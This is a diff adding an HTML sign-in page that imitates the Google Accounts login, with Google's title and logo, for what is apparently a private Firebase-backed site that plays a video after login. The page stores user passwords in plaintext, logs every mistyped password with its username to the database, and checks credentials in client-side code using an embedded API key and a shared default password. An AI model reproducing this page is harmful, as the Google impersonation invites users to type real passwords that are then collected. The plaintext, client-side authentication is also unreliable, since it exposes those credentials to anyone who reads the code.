@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Sign in – Google Accounts</title>
+<link rel="icon" type="image/png" href="favicon.png" />
+<style>
+html,body{height:100%;margin:0;font-family:Arial,Helvetica,sans-serif}
+body{background:#f1f1f1;display:flex;justify-content:center;align-items:center}
+.container{width:360px;background:#fff;padding:40px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,.2);text-align:center;z-index:1}
+.google-logo{width:75px;margin-bottom:20px}
+input{width:100%;padding:10px;margin:12px 0;border:1px solid #ccc;border-radius:4px;font-size:14px}
+button{width:100%;padding:10px;background:#1a73e8;color:#fff;border:none;border-radius:4px;cursor:pointer}
+button:hover{background:#0c5adb}
+.error{color:red;margin-top:5px}
+.small-link{font-size:11px;color:#666;cursor:pointer;margin-top:6px}
+.big-link{font-size:14px;color:#4caf50;font-weight:600}
+#videoOverlay{position:fixed;top:0;left:0;width:100%;height:100%;background:#000;display:none;justify-content:center;align-items:center;z-index:9999;cursor:none;flex-direction:column}
+#videoOverlay video{width:100%;height:100%;object-fit:cover;display:block}
+</style>
+</head>
+<body>
+
+<div class="container" id="login-container">
+  <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png" class="google-logo" alt="Logo" />
+  <h2>Sign in</h2>
+
+  <div id="step-username">
+    <input id="username" placeholder="Email or phone" autocomplete="username" />
+    <div class="error" id="username-error"></div>
+    <button onclick="checkUsername()">Next</button>
+    <p id="create-account-link" class="small-link" onclick="showCreateAccount()">Create account</p>
+    <p class="error" id="no-account-msg" style="display:none;margin-top:6px">You don't have an account! Try creating one.</p>
+  </div>
+
+  <div id="step-password" style="display:none">
+    <input id="password" type="password" placeholder="Enter your password" autocomplete="current-password"/>
+    <div class="error" id="password-error"></div>
+    <button onclick="checkPassword()">Next</button>
+    <p class="small-link" id="forgotBtn">Forgot password?</p>
+  </div>
+
+  <div id="step-change-password" style="display:none">
+    <input id="new-password" type="password" placeholder="New password" />
+    <input id="confirm-password" type="password" placeholder="Confirm new password" />
+    <div class="error" id="change-error"></div>
+    <button onclick="saveNewPassword()">Save Password</button>
+  </div>
+
+  <div id="step-create" style="display:none">
+    <input id="new-username" placeholder="Choose your username" autocomplete="username" />
+    <div class="error" id="create-error"></div>
+    <button onclick="createAccount()">Submit</button>
+    <p style="margin-top:8px">Your request will be sent for approval.</p>
+  </div>
+</div>
+
+<div id="videoOverlay">
+  <video id="combinedVideo" playsinline preload="auto"></video>
+</div>
+
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+<script>
+const firebaseConfig = {
+  apiKey: "AIzaSyBQslLAFRlIRJqsiJ2WWeTNslO067bzKYM",
+  authDomain: "taclogin-ab38e.firebaseapp.com",
+  databaseURL: "https://taclogin-ab38e-default-rtdb.firebaseio.com",
+  projectId: "taclogin-ab38e",
+  storageBucket: "taclogin-ab38e.firebasestorage.app",
+  messagingSenderId: "937853298051",
+  appId: "1:937853298051:web:119ccc7b5499514bd442b6"
+};
+firebase.initializeApp(firebaseConfig);
+const db = firebase.database();
+let currentUser = "";
+
+function resetErrors(){
+  document.getElementById('username-error').innerText='';
+  document.getElementById('password-error').innerText='';
+  document.getElementById('create-error').innerText='';
+  document.getElementById('change-error').innerText='';
+  document.getElementById('no-account-msg').style.display='none';
+  document.getElementById('create-account-link').classList.remove('big-link');
+}
+
+// ---------- USERNAME ----------
+function checkUsername(){
+  resetErrors();
+  const username = document.getElementById('username').value.trim();
+  if(!username){ document.getElementById('username-error').innerText='Enter a username'; return; }
+  db.ref('allowedUsers/'+username).once('value').then(snap=>{
+    if(snap.exists()){
+      currentUser = username;
+      document.getElementById('step-username').style.display='none';
+      document.getElementById('step-password').style.display='block';
+    } else {
+      document.getElementById('no-account-msg').style.display='block';
+      document.getElementById('create-account-link').classList.add('big-link');
+    }
+  });
+}
+
+// ---------- PASSWORD ----------
+function checkPassword(){
+  resetErrors();
+  const password = document.getElementById('password').value.trim();
+
+  db.ref('userPasswords/'+currentUser).once('value').then(snap=>{
+    const savedPassword = snap.val();
+    if(!savedPassword && password === 'tac'){
+      // first-time login with TAC → force password change
+      document.getElementById('step-password').style.display='none';
+      document.getElementById('step-change-password').style.display='block';
+    } else if(password === savedPassword){
+      // normal login
+      db.ref('logins/'+currentUser).transaction(c=> (c||0)+1);
+      db.ref('totalLogins').transaction(c=> (c||0)+1);
+      showVideoOverlay();
+    } else {
+      document.getElementById('password-error').innerText='Wrong password';
+      db.ref('failedLogins').push({ username: currentUser, triedPassword: password, time: new Date().toISOString() });
+    }
+  });
+}
+
+// ---------- CHANGE PASSWORD ----------
+function saveNewPassword(){
+  resetErrors();
+  const newPwd = document.getElementById('new-password').value.trim();
+  const confirmPwd = document.getElementById('confirm-password').value.trim();
+  if(!newPwd || !confirmPwd){ document.getElementById('change-error').innerText='Enter both fields'; return; }
+  if(newPwd !== confirmPwd){ document.getElementById('change-error').innerText='Passwords do not match'; return; }
+  db.ref('userPasswords/'+currentUser).set(newPwd);
+  db.ref('logins/'+currentUser).transaction(c=> (c||0)+1);
+  db.ref('totalLogins').transaction(c=> (c||0)+1);
+  showVideoOverlay();
+}
+
+// ---------- CREATE ACCOUNT ----------
+function showCreateAccount(){
+  resetErrors();
+  document.getElementById('step-username').style.display='none';
+  document.getElementById('step-create').style.display='block';
+  document.getElementById('new-username').value = document.getElementById('username').value.trim();
+}
+function createAccount(){
+  resetErrors();
+  const newUser = document.getElementById('new-username').value.trim();
+  if(!newUser){ document.getElementById('create-error').innerText='Enter a username'; return; }
+  Promise.all([ db.ref('allowedUsers/'+newUser).once('value'), db.ref('pendingAccounts/'+newUser).once('value') ])
+  .then(([allowedSnap,pendingSnap])=>{
+    if(allowedSnap.exists()){ document.getElementById('create-error').innerText='Account already approved. Please login.'; }
+    else if(pendingSnap.exists()){ document.getElementById('create-error').innerText='Account creation pending approval.'; }
+    else {
+      db.ref('pendingAccounts/'+newUser).set({ requestedAt:new Date().toISOString() });
+      alert('Account request sent for approval. You will be notified once approved.');
+      document.getElementById('step-create').style.display='none';
+      document.getElementById('step-username').style.display='block';
+    }
+  });
+}
+
+// ---------- FORGOT PASSWORD ----------
+document.getElementById('forgotBtn').addEventListener('click',()=>{
+  if(!currentUser) { alert('Enter your username first'); return; }
+  db.ref('notifications').push({
+    type: 'forgotPassword',
+    user: currentUser,
+    time: new Date().toISOString()
+  });
+  alert('Dev team notified. They will reset your password.');
+});
+
+// ---------- VIDEO OVERLAY ----------
+const overlay = document.getElementById('videoOverlay');
+const videoEl = document.getElementById('combinedVideo');
+function makeRedirectUrl(){
+  const href = window.location.href;
+  const folder = href.substring(0, href.lastIndexOf('/') + 1);
+  return folder + 'index.html';
+}
+function showVideoOverlay(){
+  overlay.style.display = 'flex';
+  document.body.style.cursor = 'none';
+  videoEl.src = 'combined.mp4';
+  videoEl.muted = false;
+  videoEl.currentTime = 0;
+  videoEl.play();
+  videoEl.onended = () => { window.location.replace(makeRedirectUrl()); };
+}
+</script>
+</body>
+</html>
